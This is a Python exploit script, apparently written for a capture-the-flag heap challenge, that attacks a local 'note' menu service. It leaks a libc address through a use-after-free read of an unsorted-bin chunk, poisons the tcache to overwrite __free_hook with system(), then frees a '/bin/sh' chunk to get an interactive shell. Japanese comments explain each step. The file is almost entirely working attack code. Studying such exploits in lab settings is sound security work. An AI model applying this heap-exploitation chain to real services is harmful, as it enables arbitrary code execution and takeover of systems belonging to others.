#!/usr/bin/python3
#-*-coding:utf-8-*-

import socket, telnetlib, struct, sys, logging

logging.basicConfig(level=logging.DEBUG, format="\x1b[93;41m[-] %(message)s \x1b[0m")

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rwb', buffering=None)

def read_until(f, delim=b'\n',textwrap=False):
  if type(delim) is str:
      delim = delim.encode()
  dat = b''
  while not dat.endswith(delim): dat += f.read(1)
  return dat if not textwrap else dat.decode()

def readline_after(f, skip_until):
  _ = read_until(f, skip_until)                                                                                       
  return read_until(f)

def sendline(f, line):
  if type(line) is str: 
    line = (line + '\n').encode()
  f.write(line) # no tailing LF in bytes
  f.flush()

def sendline_after(f, waitfor, line):
  read_until(f, waitfor)
  sendline(f, line)

def skips(f, nr):
  for i in range(nr): read_until(f) 

def pQ(a): return struct.pack('<Q', a&0xffffffffffffffff)
def uQ(a): return struct.unpack('<Q', a.ljust(8, b'\x00'))[0]

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
    
def dbg(ss):
  fmt = f"{ss} : "
  try:
    val = eval(ss.encode())
    if type(val) is int:
      fmt += f"{hex(val)}"
    elif type(val) is str or type(val) is bytes:
      fmt += f"{val}"
  except NameError:
    fmt = fmt.rstrip(":")
  logging.debug(fmt)

def hexify(a):
  return int(a, 16)

############## Utils #################
def menu():
  _  = read_until(f, '1: create note')
  _ += read_until(f, '2: delete note')
  _ += read_until(f, '3: edit note')
  _ += read_until(f, '4: show note')
  _ += read_until(f, '5: exit')
  _ += read_until(f, 'Command >> ')
  #print(_)
  return;

def create_note(size, data):
  sendline(f, '1')
  sendline_after(f, '[*] Note data size:', str(size))
  sendline_after(f, '[*] Note data: ', data)
  idx = int(readline_after(f, '[+] Chunk stored Index: ')) 
  # print("chunk idx: %d"%idx)
  return menu(), idx


def delete_note(idx):
  sendline(f, '2')
  sendline_after(f, 'index:', str(idx))
  # print("[+] free %d:"%idx)
  return menu()

def edit_note(idx, data):
  sendline(f, '3')
  sendline_after(f, 'index: ', str(idx))
  sendline_after(f, 'data: ', data)
  return menu()


def show_note(idx):
  sendline(f, '4')
  sendline_after(f, 'index: ', str(idx))
  note = readline_after(f, ':')  
  return note

#### plt/got, rop gadgets, symbs addrs and consts ####
ofs_av_top      = 0x3b5be0
ofs_malloc_hook = 0x3b5b70
ofs_free_hook   = 0x3b7e48
#ofs_onegadget   = 0x0c571f
ofs_system      = 0x0430a0

banner = 'test'
HOST, PORT = '127.0.0.1', 1337 
logging.info(banner)
s, f = sock(HOST, PORT)
menu()

for i in range(0x8):
  _, X = create_note(0x100, b'X' * 0x90) # idx 0 ~ 7

_, Z = create_note(0x100, b'/bin/sh\x00' * 0x90) # idx 8: top chunkに併合されないためののdummyチャンク

## 7回同じサイズのチャンクをfreeしてtcacheを潰しておく. 
for i in range(0x6, -1, -1):
  delete_note(i)

delete_note(7) # idx 7はtcacheではなく, unsorted binにつながっている. 
leak = show_note(7) # unsorted binに一つだけつながっている時は, main_arena->topからlibcのアドレスをリークできる. 
## リークからlibcのアドレス各種を算出. 
av_top = uQ(leak.strip())
libc_base   = av_top - ofs_av_top
#malloc_hook = libc_base + ofs_malloc_hook 
free_hook   = libc_base + ofs_free_hook
addr_system = libc_base + ofs_system
dbg("av_top")
dbg("libc_base")
dbg("free_hook")
dbg("addr_system")
## UAF-> AAW primitive malloc_hook->one_gadget
edit_note(0, pQ(free_hook))
_,X = create_note(0x100, b'X'*0x90)
_,Y = create_note(0x100, pQ(addr_system))
input('gdb?')
sendline(f, '2')
sendline_after(f, ':', str(Z)) # trigger free hook
shell(s)
